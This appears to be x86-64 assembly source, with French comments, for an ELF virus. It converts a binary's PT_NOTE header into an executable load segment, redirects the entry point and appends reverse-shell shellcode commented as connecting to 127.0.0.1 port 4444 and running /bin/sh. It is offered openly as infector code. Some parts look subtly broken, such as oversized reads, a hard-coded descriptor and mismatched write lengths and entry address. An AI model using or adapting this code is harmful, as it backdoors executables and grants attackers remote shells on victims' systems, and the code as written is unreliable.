section .data
    p_type db 0x01, 0x00
    p_flags db 0x05, 0x00
    p_vaddr dq 0xc000000
    new_mem_size dq 0xCC
    new_file_size dq  0xCC
    new_alignement dq 0x2000
    new_entry dq 0x400000
    shellcode db 0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x97,0xb0,0x2a,0x48,0xb9,0xfe,0xff,0xee,0xa3,0x80,0xff,0xff,0xfe,0x48,0xf7,0xd9,0x51,0x54,0x5e,0xb2,0x10,0x0f,0x05,0x6a,0x03,0x5e,0xb0,0x21,0xff,0xce,0x0f,0x05,0x75,0xf8,0x99,0xb0,0x3b,0x52,0x48,0xb9,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x51,0x54,0x5f,0x0f,0x05
    ;127.0.0.1 port 4444

section .bss
    fd resd 1
    buffer resb 64
    entry_point resq 1
    note_offset resq 1
    filename resq 1
    new_vaddr resq 1
    file_size resq 1
    

    

section .text
    global _start

_start:

;----------------------------------------ouverture du fichier en mode lecture / écriture --------------------------------
    pop rax
    cmp rax, 2 ;; nb d'elem
    jne error
    ; on retire le nom du fichier executable
    pop rsi
    ; recuperation de l'argument 1
    pop rax
    mov [filename], rax
    mov rax, 2
    mov rdi, [filename]
    mov rsi, 2
    syscall
    ; verification des erreurs
    test rax, rax 
    js error
    ; Sauvegarde du descripteur de fichier
    mov [fd], rax
    ; Lecture du fichier
    mov rax, 0
    mov rdi, [fd]
    mov rsi, buffer
    mov rdx, 2000
    syscall
;--------------------------------------calcule de la taille de fichier-------------------------------
    mov rax, 8
    mov rdi, [fd]
    mov rsi, 0
    mov rdx, 1
    syscall

    mov rax, rdx

    mov rax, 8
    mov rdi, [fd]
    mov rsi, 0
    mov rdx, 2
    syscall

    mov [file_size], rax

    mov rax, 8
    mov rdi, [fd]
    mov rsi, 0
    mov rdx, 0
    syscall


;----------------------------------------Sauvegarde de l'entrée du programme (e_entry)--------------------------------
    mov rsi, buffer               ; Adresse du début de l'entête ELF
    mov rax, [rsi + 0x18]         ; Lecture du champ e_entry (64 bits)
    mov [entry_point], rax        ; Sauvegarde dans la zone de mémoire

;---------------------------------------PT_NOTE--------------------------------
_parse_phr:
    xor rcx, rcx
    xor rdx, rdx
    mov cx, 12
    mov rbx, 64
    mov dx, 56

    loop_phdr:
        add rbx, rdx
        dec rcx
        xor r13, r13
        mov r13d, dword [buffer + rbx]
        cmp dword [buffer + rbx], 0x4
        je pt_note_ok
        cmp rcx,0
        jg loop_phdr

    pt_note_ok:
    
    mov [note_offset], rbx
    ;remise a 0 des registres
    xor rax,rax
    xor rcx,rcx
    xor rdx,rdx
;-----------------------------------transformation du pt note en pt load (p_type)---------------------------------------
    mov rax,8
    mov rdi, [fd]
    mov rsi, [note_offset]
    mov rdx, 0
    syscall

    xor rax,rax

    mov rax, 1
    mov rdi, 3
    mov rsi, p_type
    mov rdx, 2
    syscall
    xor rax,rax
;-----------------------------------transformation du pt note en pt load (p_flags)---------------------------------------
    mov rax, 8
    mov rdi, [fd]
    mov rsi, [note_offset]
    add rsi, 4
    mov rdx, 0
    syscall

    xor rax,rax

    mov rax, 1
    mov rdi, 3
    mov rsi, p_flags
    mov rdx, 2
    syscall
    xor rax,rax
;-----------------------------------transformation du pt note en pt load (p_vaddr)---------------------------------------
    mov rax, [p_vaddr]
    add rax, [file_size]
    mov [new_vaddr], rax

    xor rax, rax

    mov rax, 8
    mov rdi, [fd]
    mov rsi, [note_offset]
    add rsi, 16
    mov rdx,0
    syscall

    xor rax, rax

    mov rax, 1
    mov rdi, 3
    mov rsi, new_vaddr
    mov rdx, 4
    syscall
    xor rax,rax

;-----------------------------------transformation du pt note en pt load (taille fichier)---------------------------------------
    mov rax, 8
    mov rdi, [fd]
    mov rsi, [note_offset]
    add rsi, 32
    mov rdx, 0
    syscall

    xor rax,rax

    mov rax, 1
    mov rdi, 3
    mov rsi, new_file_size
    mov rdx, 1
    syscall
    xor rax,rax

;-----------------------------------transformation du pt note en pt load (taille mémoire)---------------------------------------
    mov rax, 8
    mov rdi, [fd]
    mov rsi, [note_offset]
    add rsi, 40
    mov rdx, 0
    syscall

    xor rax,rax

    mov rax, 1
    mov rdi, 3
    mov rsi, new_mem_size
    mov rdx, 1
    syscall
    xor rax,rax

;-----------------------------------transformation du pt note en pt load (alignement)---------------------------------------
    mov rax, 8
    mov rdi, [fd]
    mov rsi, [note_offset]
    add rsi, 48
    mov rdx, 0
    syscall

    xor rax,rax

    mov rax, 1
    mov rdi, 3
    mov rsi, new_alignement
    mov rdx, 3
    syscall
    xor rax,rax


;--------------------------changement du p-offset-----------------------------------------------------
        xor rax,rax
        mov rax, 8
        mov rdi, [fd]
        mov rsi, [note_offset]
        add rsi, 8
        mov rdx, 0
        syscall

        xor rax,rax
        mov rax, 1
        mov rdi, 3
        mov rsi, file_size
        mov rdx, 3
        syscall

        xor rax,rax


;--------------------------changement du e-entry-----------------------------------------------------
    mov rax, 8
    mov rdi, [fd]
    mov rsi, 0x18
    mov rdx, 0
    syscall

    mov rax, 1
    mov rdi, 3
    mov rsi, new_entry
    mov rdx, 8
    syscall
    xor rax, rax


;--------------------------écriture du shellcode-----------------------------------------------------

    mov rax, 8
    mov rdi, [fd]
    mov rsi, 0 
    mov rdx, 2
    syscall


    xor rax, rax
    mov rax, 1
    mov rdi, 3
    mov rsi, shellcode
    mov rdx, 0x41
    syscall


;----------------------------------------fermeture du fichier --------------------------------
    mov rax, 3
    mov rdi, [fd]
    syscall

;----------------------------------------sortie--------------------------------
    mov rax, 60
    mov rdi, 0
    syscall

error:
    mov rax, 60
    mov rdi, 1
    syscall
